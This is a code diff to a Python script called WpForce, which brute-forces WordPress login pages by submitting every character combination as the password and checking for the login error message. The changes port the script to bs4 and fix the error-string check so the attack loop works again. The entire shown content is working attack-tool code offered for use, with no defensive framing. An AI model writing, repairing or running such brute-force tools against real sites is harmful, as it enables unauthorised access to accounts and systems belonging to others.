@@ -3,7 +3,7 @@ import sys
 import string
 import itertools
 from mechanize import Browser
-from BeautifulSoup import BeautifulSoup
+from bs4 import BeautifulSoup
 
 def WpForce(target_url, password_max_length = 8):
     max_length = password_max_length
@@ -27,11 +27,11 @@ def WpForce(target_url, password_max_length = 8):
                     br["pwd"] = guess
                     
                     response = br.submit()
-                    parsed_html = BeautifulSoup(response)
+                    parsed_html = BeautifulSoup(response.read(), 'html.parser')
                     check_response = parsed_html.body.find('div', attrs={'id':'login_error'}).text
                     total_guesses = total_guesses + 1
 
-                    if check_response[0:5] == "ERROR":
+                    if check_response[1:6] == "ERROR":
                         if temp_count > report_guess:
                             print("# Login Failed on guess: " + str(guess) + " | Total Guesses: " + str(total_guesses))
                             temp_count = 0
